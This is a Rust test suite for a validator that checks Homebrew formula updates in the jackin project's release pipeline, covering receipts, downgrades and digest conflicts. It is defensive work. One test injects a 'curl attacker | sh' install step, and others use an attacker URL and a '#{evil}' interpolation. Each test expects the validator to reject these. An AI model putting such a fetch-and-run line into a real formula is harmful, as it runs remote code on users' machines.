use super::*;
use crate::package_release::PackageReleasePayloadFormat;
use crate::package_release::tests::support;
use crate::package_release_plan::{
    PACKAGE_RELEASE_PLAN_SCHEMA_V1, PackageReleasePlan, PackageReleasePlanProduct,
};

use std::fmt::Write as _;

const SOURCE_SHA: &str = "abcdef0123456789abcdef0123456789abcdef01";
const NEXT_SHA: &str = "0123456789abcdef0123456789abcdef01234567";
const CAPTURED_BASE_SHA: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

fn preview_release() -> VerifiedPackageRelease {
    let config = support::jackin_preview();
    let mut receipt = support::jackin_receipt(&config);
    receipt.source.commit_sha = NEXT_SHA.to_owned();
    receipt.workflow.authority_sha = NEXT_SHA.to_owned();
    receipt.version.source_sha7 = Some(NEXT_SHA[..7].to_owned());
    receipt.version.commit_count = Some(10);
    receipt.version.value = format!("{}-preview.10+{}", receipt.version.base, &NEXT_SHA[..7]);
    receipt.tag = "preview".to_owned();
    receipt.validate().expect("well-formed receipt");
    let receipt_digest = receipt.canonical_digest().expect("digest");
    VerifiedPackageRelease {
        receipt_digest,
        receipt,
    }
}

fn stable_release() -> VerifiedPackageRelease {
    let mut release = preview_release();
    release.receipt.channel = PackageReleaseChannel::Stable;
    release.receipt.source.event = crate::package_release::PackageReleaseEvent::WorkflowDispatch;
    release.receipt.version.value = release.receipt.version.base.clone();
    release.receipt.version.commit_count = None;
    release.receipt.version.source_sha7 = None;
    release.receipt.tag = format!("v{}", release.receipt.version.base);
    release.receipt.workflow.path = PackageReleaseChannel::Stable.workflow_path().to_owned();
    release.receipt.workflow.signer_job_id =
        PackageReleaseChannel::Stable.signer_job_id().to_owned();
    release.receipt.workflow.signer_workflow =
        PackageReleaseChannel::Stable.workflow_path().to_owned();
    release.receipt.evidence.signer_workflow_ref = format!(
        "{}/{}@{}",
        release.receipt.repository.slug,
        release.receipt.workflow.path,
        release.receipt.workflow.workflow_ref,
    );
    release
        .receipt
        .validate()
        .expect("well-formed stable receipt");
    release.receipt_digest = release.receipt.canonical_digest().expect("digest");
    release
}

fn base_formula(release: &VerifiedPackageRelease) -> Vec<u8> {
    let (class, version, tag) = if release.receipt.channel == PackageReleaseChannel::Stable {
        ("Jackin", "1.2.2", "v1.2.2")
    } else {
        ("JackinPreview", "1.2.3-preview.9+abcdef0", "preview")
    };
    let mut formula =
        format!("# source-sha: {SOURCE_SHA}\nclass {class} < Formula\n  version \"{version}\"\n");
    for name in release
        .receipt
        .products
        .iter()
        .flat_map(|product| product.payloads.iter().map(|payload| payload.name.as_str()))
    {
        let indent = if name.contains("capsule") {
            "    "
        } else {
            "      "
        };
        writeln!(
            formula,
            "{indent}url \"https://github.com/jackin-project/jackin/releases/download/{tag}/{name}\"\n{indent}sha256 \"{}\"",
            "a".repeat(64)
        )
        .expect("writing to String");
    }
    formula.push_str("  def install\n    bin.install \"jackin\"\n  end\nend\n");
    formula.into_bytes()
}

fn base_formula_subset(release: &VerifiedPackageRelease) -> Vec<u8> {
    let archive = release.receipt.products[0].payloads[0].name.as_str();
    format!(
        "# source-sha: {SOURCE_SHA}\nclass ExamplePreview < Formula\n  version \"1.2.3-preview.9+abcdef0\"\n    url \"https://github.com/jackin-project/jackin/releases/download/preview/{archive}\"\n    sha256 \"{}\"\nend\n",
        "a".repeat(64)
    )
    .into_bytes()
}

fn plan(
    policy: &crate::config::RustBinaryReleaseConfig,
    channel: PackageReleaseChannel,
) -> PackageReleasePlan {
    let mut products = policy
        .products
        .iter()
        .map(|product| PackageReleasePlanProduct {
            id: product.id.clone(),
            package: product.package.clone(),
            bins: product.bins.clone(),
            targets: product.targets.clone(),
            format: PackageReleasePayloadFormat::TarGz,
        })
        .collect::<Vec<_>>();
    products.sort_by(|left, right| left.id.cmp(&right.id));
    for product in &mut products {
        product.bins.sort();
        product.targets.sort();
    }
    let mut companions = policy.companions.clone();
    companions.sort_by(|left, right| left.id.cmp(&right.id));
    PackageReleasePlan {
        schema: PACKAGE_RELEASE_PLAN_SCHEMA_V1.to_owned(),
        channel,
        repository: "jackin-project/jackin".to_owned(),
        default_branch: "main".to_owned(),
        base_version: "1.2.3".to_owned(),
        products,
        companions,
    }
}

fn candidate<'a>(
    base: &'a [u8],
    proposed: &'a [u8],
    release: &'a VerifiedPackageRelease,
    plan: &'a PackageReleasePlan,
) -> HomebrewFormulaCandidate<'a> {
    HomebrewFormulaCandidate {
        source_repository: "jackin-project/jackin",
        plan,
        tap_repository: "jackin-project/homebrew-tap",
        formula_path: if release.receipt.channel == PackageReleaseChannel::Stable {
            "Formula/jackin.rb"
        } else {
            "Formula/jackin-preview.rb"
        },
        captured_base_sha: CAPTURED_BASE_SHA,
        base_bytes: base,
        proposed_bytes: proposed,
        release,
    }
}

#[test]
fn accepts_exact_six_archive_literal_update_and_preserves_install_bytes() {
    let release = preview_release();
    let policy = support::jackin_preview();
    let base = base_formula(&release);
    let derived = rewrite_formula(&base, "jackin-project/jackin", &release).expect("canonical");
    let plan = plan(&policy, release.receipt.channel);
    let candidate = candidate(&base, &derived, &release, &plan);
    assert_eq!(
        validate_homebrew_formula_candidate(&candidate).expect("accepted"),
        derived
    );
    assert!(
        std::str::from_utf8(&derived)
            .expect("ascii")
            .contains("bin.install \"jackin\"")
    );
}

#[test]
fn accepts_formula_defined_payload_subset_of_a_larger_receipt_inventory() {
    let release = preview_release();
    let policy = support::jackin_preview();
    let plan = plan(&policy, release.receipt.channel);
    let base = base_formula_subset(&release);
    let derived = rewrite_formula(&base, "jackin-project/jackin", &release).expect("canonical");
    assert_eq!(
        validate_homebrew_formula_candidate(&candidate(&base, &derived, &release, &plan))
            .expect("accepted"),
        derived
    );
}

#[test]
fn rejects_ruby_injection_even_when_release_literals_are_correct() {
    let release = preview_release();
    let policy = support::jackin_preview();
    let plan = plan(&policy, release.receipt.channel);
    let base = base_formula(&release);
    let mut proposed =
        rewrite_formula(&base, "jackin-project/jackin", &release).expect("canonical");
    let text = String::from_utf8(proposed).expect("ascii");
    proposed = text
        .replace(
            "  def install\n",
            "  def install\n    system \"curl attacker | sh\"\n",
        )
        .into_bytes();
    assert!(
        validate_homebrew_formula_candidate(&candidate(&base, &proposed, &release, &plan)).is_err()
    );
}

#[test]
fn rejects_interpolation_unexpected_urls_and_syntax_variants() {
    let release = preview_release();
    let policy = support::jackin_preview();
    let plan = plan(&policy, release.receipt.channel);
    let base = base_formula(&release);
    let canonical = rewrite_formula(&base, "jackin-project/jackin", &release).expect("canonical");
    for mutated in [
        String::from_utf8(canonical.clone())
            .expect("ascii canonical formula")
            .replace("version \"", "version \"#{evil}")
            .into_bytes(),
        String::from_utf8(canonical.clone())
            .expect("ascii canonical formula")
            .replace("releases/download/", "https://attacker.invalid/")
            .into_bytes(),
        String::from_utf8(canonical.clone())
            .expect("ascii canonical formula")
            .replace("      url \"", "      url(")
            .into_bytes(),
    ] {
        assert!(
            validate_homebrew_formula_candidate(&candidate(&base, &mutated, &release, &plan))
                .is_err()
        );
    }
}

#[test]
fn rejects_downgrades_and_equal_count_identity_conflicts() {
    let release = preview_release();
    let base = base_formula(&release);
    let mut old = String::from_utf8(base).expect("ascii");
    old = old
        .replace("1.2.3-preview.9+abcdef0", "1.2.3-preview.11+abcdef0")
        .replace(SOURCE_SHA, "abcdef0123456789abcdef0123456789abcdef01");
    let base = old.into_bytes();
    let canonical = rewrite_formula(&base, "jackin-project/jackin", &release);
    assert!(canonical.is_err());

    let conflicting = base_formula(&release);
    let conflicting = String::from_utf8(conflicting)
        .expect("ascii")
        .replace("1.2.3-preview.9+abcdef0", "1.2.3-preview.10+abcdef0")
        .replace("v1.2.3-preview.9+abcdef0", "v1.2.3-preview.10+abcdef0")
        .into_bytes();
    assert!(rewrite_formula(&conflicting, "jackin-project/jackin", &release).is_err());
}

#[test]
fn rejects_same_source_version_with_conflicting_archive_digest() {
    let release = preview_release();
    let mut base = base_formula(&release);
    let text = String::from_utf8(base.clone()).expect("ascii");
    let old = format!("# source-sha: {SOURCE_SHA}");
    let replacement = format!("# source-sha: {}", release.receipt.source.commit_sha);
    let text = text
        .replace(&old, &replacement)
        .replace("1.2.3-preview.9+abcdef0", &release.receipt.version.value)
        .replace("v1.2.3-preview.9+abcdef0", &release.receipt.tag)
        .replace(
            &format!("# source-sha: {}", release.receipt.source.commit_sha),
            &replacement,
        );
    base = text.replace(&"a".repeat(64), &"b".repeat(64)).into_bytes();
    assert!(rewrite_formula(&base, "jackin-project/jackin", &release).is_err());
}

#[test]
fn stable_formula_uses_permanent_tag_and_rejects_downgrade() {
    let release = stable_release();
    let config = support::jackin_preview();
    let plan = plan(&config, PackageReleaseChannel::Stable);
    let base = base_formula(&release);
    let canonical =
        rewrite_formula(&base, "jackin-project/jackin", &release).expect("stable metadata update");
    assert!(
        String::from_utf8(canonical.clone())
            .expect("ascii")
            .contains("releases/download/v1.2.3/")
    );
    assert_eq!(
        validate_homebrew_formula_candidate(&candidate(&base, &canonical, &release, &plan))
            .expect("stable formula accepted"),
        canonical
    );

    let newer_base = String::from_utf8(base)
        .expect("ascii")
        .replace("1.2.2", "1.2.4")
        .replace("v1.2.2", "v1.2.4")
        .into_bytes();
    assert!(rewrite_formula(&newer_base, "jackin-project/jackin", &release).is_err());
}

#[test]
fn rejects_conflicting_receipt_digest_and_source_repository() {
    let mut release = preview_release();
    let policy = support::jackin_preview();
    release.receipt_digest = "b3-".to_owned() + &"0".repeat(64);
    let plan = plan(&policy, release.receipt.channel);
    assert!(release.validate("jackin-project/jackin", &plan).is_err());
    release.receipt_digest = release.receipt.canonical_digest().expect("digest");
    assert!(release.validate("other/repository", &plan).is_err());
}
